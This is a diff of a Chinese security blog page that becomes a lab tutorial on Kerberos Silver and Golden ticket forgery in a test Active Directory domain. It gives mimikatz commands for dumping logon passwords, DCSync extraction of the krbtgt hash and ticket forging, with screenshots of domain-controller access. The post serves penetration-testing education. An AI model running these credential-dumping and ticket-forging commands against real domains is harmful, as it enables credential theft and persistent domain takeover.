@@ -5,8 +5,6 @@
   <!-- SEO相关 -->
   
     
-      <meta name="robots" content="noindex,follow">
-    
   
   <!-- 渲染优化 -->
   <meta http-equiv='x-dns-prefetch-control' content='on' />
@@ -24,7 +22,9 @@
 
   <!-- 页面元数据 -->
   
-  <title>标签：python - F</title>
+  <title>白银/黄金票据 - F</title>
+  
+    <meta name="keywords" content="域">
   
 
   
@@ -269,7 +269,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="l_cover">
   
     
-        <div id="half" class='cover-wrapper  focus' style="display: ;">
+        <div id="half" class='cover-wrapper post focus' style="display: ;">
           
             <div id='cover-backstretch'></div>
           
@@ -302,258 +302,232 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper" id="pjax-container">
           
 
-
 <div class='l_main'>
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
   
+
+
+  
+  <div class="article-meta" id="top">
     
-      
-  <section class="post-list">
     
-      
+    
+      <h1 class="title">
+        白银/黄金票据
+      </h1>
+      <div class='new-meta-box'>
         
+          
+            
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="">
+    <p>请设置文章作者</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class='new-meta-item category'>
+    <a class='notlink'>
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="sep"></span><a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>
+    </a>
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2021年4月9日</p>
+  </a>
+</div>
+
           
         
           
         
+      </div>
+    
+  </div>
+
+
+  
+  
+  <p><img src="https://i.loli.net/2021/05/13/fmHiUMGOtrBphCj.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/fmHiUMGOtrBphCj.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="Kouzou-Sakai-Folio-Illustration-conceptual-people-animals-transportation-Personal-Work-Story-Of-Desert-1-1500x2104"></p>
+<span id="more"></span>
+
+<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>域内的两种攻击方式: 白银票据(SilverTicket)、黄金票据(GoldenTicket)，横向或权限维持中常用到。利用kerberos认证过程中通过伪造票据来伪造用户</p>
+<h4 id="kerberos认证"><a href="#kerberos认证" class="headerlink" title="kerberos认证"></a>kerberos认证</h4><p><img src="https://i.loli.net/2021/05/13/r8VR7inBdyTOtpx.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/r8VR7inBdyTOtpx.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="kerberos认证流程"></p>
+<p><img src="https://i.loli.net/2021/05/13/ixLCXYPV1rqAwuS.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/ixLCXYPV1rqAwuS.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="kerberos认证流程2"></p>
+<p>KDC(Key Distribution Center): 密钥分发中心<br>AD(accountdatabase): 存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT<br>AS(Authentication Service): 为client生成TGT的服务<br>TGS(Ticket Granting Service): 票据发放服务,为client生成某个服务的ticket<br>TGT: 认证票据<br>ST: 服务票据</p>
+<ol>
+<li>client向kerberos服务请求，希望获取访问server的权限。kerberos得到了这个消息，首先得判断client是否是可信赖的，也就是白名单黑名单的说法。这就是AS服务完成的工作，通过在AD中存储黑名单和白名单来区分client。成功后，返回AS返回TGT给client。</li>
+<li>client得到了TGT后，继续向kerberos请求，希望获取访问server的权限。kerberos又得到了这个消息，这时候通过client消息中的TGT，判断出了client拥有了这个权限，给了client访问server的权限ticket。</li>
+<li>client得到ticket后，终于可以成功访问server。这个ticket只是针对这个server，其他server需要向TGS申请。</li>
+</ol>
+<h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">域</span><br><span class="line">thomas.com</span><br><span class="line">域管</span><br><span class="line">thomas&#x2F;administrator</span><br><span class="line">域成员</span><br><span class="line">thomas&#x2F;user01</span><br><span class="line"></span><br><span class="line">域控</span><br><span class="line">win-dc</span><br><span class="line">192.168.3.10</span><br><span class="line">windows server 2008r2</span><br><span class="line"></span><br><span class="line">内网机器</span><br><span class="line">win-user01</span><br><span class="line">192.168.3.100</span><br><span class="line">windows server 2008r2</span><br></pre></td></tr></table></figure>
+
+<h4 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h4><p>白银票据是要伪造出TGS颁发给Client的ST</p>
+<p>在Kerberos认证的第三步，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key 解密ST,从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份,验证成功就让 Client 访问server上的指定服务了只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是伪造的门票只对部分服务起作用。</p>
+<h5 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h5><ul>
+<li><p>伪造ST, 只能访问伪造服务账号所对应的服务</p>
+</li>
+<li><p>不与KDC交互，直接访问Server</p>
+</li>
+<li><p>由服务账号NTLM加密</p>
+</li>
+</ul>
+<h5 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h5><p>以cifs服务为例</p>
+<p>user01域成员无法直接访问域控磁盘，通过伪造cifs服务票据进行尝试</p>
+<p><img src="https://i.loli.net/2021/05/13/4CvdybfJZuIKLlN.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/4CvdybfJZuIKLlN.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="dir域控c盘拒绝"></p>
+<p>获取user01的sid</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/05/13/sEUoTHht8aOCD2l.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/sEUoTHht8aOCD2l.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="user01_sid"></p>
+<p>在域管登录的掝控上执行命令，获取cifs服务账号NTLM hash值。此处为WIN-DC$用户，因为要利用共享服务账号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privelege::debug sekurlsa::logonpasswords exit &gt; dc_mimikatz.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i.loli.net/2021/05/13/RufvWq4Cgx9oLFN.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/RufvWq4Cgx9oLFN.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="dc_logonpasswords"></p>
+<p><img src="https://i.loli.net/2021/05/13/Zjey9TG238a7C5H.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/Zjey9TG238a7C5H.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="dc_htlm"></p>
+<p>伪造服务票据ST</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe kerberos::golden &#x2F;domain:thomas.com &#x2F;sid:S-1-5-21-3339550086-1671576957-2609362215 &#x2F;target:win-dc.thomas.com &#x2F;rc4:05d2835ce303d171b5e94ac5921555dd &#x2F;service:cifs &#x2F;user:test &#x2F;ppt</span><br></pre></td></tr></table></figure>
+
+<p>tips：sid最后的<code>-</code>后的不用加</p>
+<p><img src="https://i.loli.net/2021/05/13/tCBOI4E1qvWpybo.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/tCBOI4E1qvWpybo.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="伪造票据"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden: 使用minikatz中票据的功能</span><br><span class="line">&#x2F;domain: 指定域名</span><br><span class="line">&#x2F;sid: Client端查询的sid号，在域控中查询也可以，都是一样的</span><br><span class="line">&#x2F;target: 主域控中的计算机全名</span><br><span class="line">&#x2F;rc4: 在域控中抓取的hash(NTLM)</span><br><span class="line">&#x2F;service: 需要伪造的服务(cifs只是其中的一种服务，可伪造的服务很多)</span><br><span class="line">&#x2F;user: 需要伪造的用户名(可自定义)</span><br><span class="line">&#x2F;ppt: 伪造了以后直接写入到内存中</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/05/13/qNxGJhlCnToYzIB.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/qNxGJhlCnToYzIB.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="伪造并导入内存成功"></p>
+<p>查看票据，导入成功</p>
+<p><img src="https://i.loli.net/2021/05/13/e7OyVNCuls2KBdw.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/e7OyVNCuls2KBdw.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="查看票据"></p>
+<p>测试</p>
+<p>成功列出域控c盘文件，使用psexec远程连接域控，<code>whoami</code>用户为我们所伪造的用户名<code>test</code></p>
+<p><img src="https://i.loli.net/2021/05/13/Qot5PFNjzBqpVnc.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/Qot5PFNjzBqpVnc.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="伪造成功"></p>
+<p>尝试访问其他服务，发现失败。获取krbtgt信息需要LDAP服务的管理权限。</p>
+<p><img src="https://i.loli.net/2021/05/13/j4Cu8HAzNQ1GUtM.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/j4Cu8HAzNQ1GUtM.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="访问其他服务失败"></p>
+<h5 id="服务列表"><a href="#服务列表" class="headerlink" title="服务列表"></a>服务列表</h5><p><img src="https://i.loli.net/2021/05/13/xnDRicg5TaEGsoN.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/xnDRicg5TaEGsoN.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210513181520736"></p>
+<h4 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h4><h5 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h5><ul>
+<li>伪造TGT,可以获取任意kerberos的访问权限</li>
+<li>与KDC交互，但不与AS交互</li>
+<li>由krbtgt NTLM hash加密</li>
+</ul>
+<h5 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h5><p>user01域成员无法直接访问域控磁盘，通过伪造TGT获取域控权限</p>
+<p><img src="https://i.loli.net/2021/05/13/4CvdybfJZuIKLlN.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/4CvdybfJZuIKLlN.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="dir域控c盘拒绝"></p>
+<p>域管登录域控，执行命令，查看<code>krbtgt</code>用户<code>sid</code>和<code>NTLM hash</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;lsadump::dcsync &#x2F;domain:thomas.com &#x2F;user:krbtgt&quot; exit &gt; krbtgt.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/05/13/JFiaCzlcGPN5Qp8.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/JFiaCzlcGPN5Qp8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="krbtgt"></p>
+<p><img src="https://i.loli.net/2021/05/13/9dQjgIP56FlJ3Sq.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/9dQjgIP56FlJ3Sq.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="krbtgt_NTLM_sid"></p>
+<p>通过<code>krbtgt</code>的sid和hash，生成并导出黄金票据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden &#x2F;admin:system &#x2F;domain:thomas.com &#x2F;sid:S-1-5-21-3339550086-1671576957-2609362215 &#x2F;krbtgt:8c050462c2012b041c3b23408e86330a &#x2F;ticket:ticket.kirbi&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p>tips：sid最后的<code>-</code>后的不用加</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;admin: 伪造的用户名</span><br><span class="line">&#x2F;domain: 域名称</span><br><span class="line">&#x2F;sid: SID值，注意是去掉最后一个-后面的值</span><br><span class="line">&#x2F;krbtgt: krbtgt的HASH值</span><br><span class="line">&#x2F;ticket: 生成的票据名称    &#x2F;&#x2F;不是写入内存中的命令</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/05/13/rZU46CtdesgcIqK.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/rZU46CtdesgcIqK.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="导出krbtgt票据"></p>
+<p>清空票据并导入黄金票据</p>
+<p><img src="https://i.loli.net/2021/05/13/pgRKG9ky2dWHmrs.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/pgRKG9ky2dWHmrs.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="导入票据"></p>
+<p>cmd命令出可以清除票据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">klist purge # 清除票据</span><br><span class="line">klist # 列出票据</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/05/13/9UBEaZrWCHKcIbG.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/9UBEaZrWCHKcIbG.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="清除票据"></p>
+<p>测试</p>
+<p><img src="https://i.loli.net/2021/05/13/O6eb1D2WZIYcPvw.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/O6eb1D2WZIYcPvw.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="dir域控c盘"></p>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/8119013.html">https://www.cnblogs.com/backlion/p/8119013.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets</a></p>
+
+  
+  
+    
+    <div class='footer'>
+      
+      
+      
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-05-13T18:31:05+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2021年5月13日</p>
+  </a>
+</div>
+
+        
+      
+        
           
-        
-          
-        
-          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E5%9F%9F/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>域</p></a></div>
+
+
         
       
-    
-    
-      
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/08/10/python%E5%AE%9E%E7%8E%B0Typora%E7%B2%98%E8%B4%B4%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87/">
-        python实现Typora粘贴上传图片
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p><img src="https://i.loli.net/2021/04/26/Px7oWBsXTUOjL2a.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/04/26/Px7oWBsXTUOjL2a.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="Folio-Illustration-Ricardo-Bessa-Self_RBessa_1-Godafoss_web"></p>
-    
+      
+    </div>
   </div>
+
+
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-08-10</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/python/">python</a>
-        
-      </div>
+  
+
+  
+    <div class="prev-next">
       
-        <div>
-          <a class='readmore' href='/2020/08/10/python%E5%AE%9E%E7%8E%B0Typora%E7%B2%98%E8%B4%B4%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87/'>
-            阅读全文
-          </a>
-        </div>
+        <a class='prev' href='/2021/05/10/%E5%9F%9F%E5%86%85DNSAdmins%E7%BB%84%E6%88%90%E5%91%98%E6%8F%90%E6%9D%83%E4%B8%BA%E5%9F%9F%E7%AE%A1/'>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>域内DNSAdmins组成员提权为域管</p>
+          <p class='content'>
+
+
+前言利用DNSAdmins组成员，通过dnscmd远程注入恶意dll，实现提权
+环境1234567891011121314151617181920域thomas.com域管thomas&#...</p>
+        </a>
+      
+      
+        <a class='next' href='/2020/08/10/python%E5%AE%9E%E7%8E%B0Typora%E7%B2%98%E8%B4%B4%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87/'>
+          <p class='title'>python实现Typora粘贴上传图片<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>
+
+
+在用Typora编写文本时，实现图片粘贴后自动上传到smms图床并返回url
+项目地址
+设置注册登录自己的smms
+生成Secret Token
+
+将Secret Token替换脚本中的t...</p>
+        </a>
       
     </div>
   
+</article>
 
-</div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/06/18/droopy/">
-        droopy
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p><img src="https://i.loli.net/2021/04/25/1QASP89vEdfhnsi.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/04/25/1QASP89vEdfhnsi.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="Alex-Green-Folio-Art-Illustration-Radio-Times-Chris-Yates-988x1536"></p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-06-18</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/python/">python</a>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/06/18/droopy/'>
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
   
 
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2019/08/23/%E7%AA%83%E5%8F%96%E5%87%AD%E6%8D%AE%E4%B8%8Ecookie/">
-        窃取凭据与cookie
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p><img src="https://i.loli.net/2021/04/25/onCbQdpqi75Ezyt.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/04/25/onCbQdpqi75Ezyt.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="Alex-Green-Folio-Illustration-Ten-Speed-Press-Wine-Vineyard-Spain"></p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2019-08-23</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/python/">python</a>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2019/08/23/%E7%AA%83%E5%8F%96%E5%87%AD%E6%8D%AE%E4%B8%8Ecookie/'>
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2019/08/01/%E5%BB%BA%E7%AB%8B%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8part2/">
-        建立键盘记录器part2
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
